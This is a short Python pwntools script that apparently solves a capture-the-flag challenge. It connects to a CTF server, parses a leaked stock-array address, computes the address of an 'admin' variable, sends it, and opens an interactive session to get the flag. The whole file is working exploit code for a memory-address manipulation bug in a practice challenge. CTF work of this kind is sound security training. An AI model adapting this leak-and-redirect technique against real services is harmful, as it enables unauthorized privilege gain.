from pwn import *

#binary = ELF('./challenge')
#p = process(binary.path)
p = remote("pwn.ctf.secso.cc", 5001)

print(p.recvline()) # hello and welcome
print(p.recvline()) # here's our stock

stock_array_address = int(p.recvline().split()[-1]) # address of stock array + 4

print(p.recvline()) # &stock[2]
print(p.recvline()) # &stock[3]
print(p.recvline()) # what's your age

p.sendline(str(stock_array_address-32).encode("latin-1") + b"\n") # send address of admin variable
p.interactive() # Flag will now appear
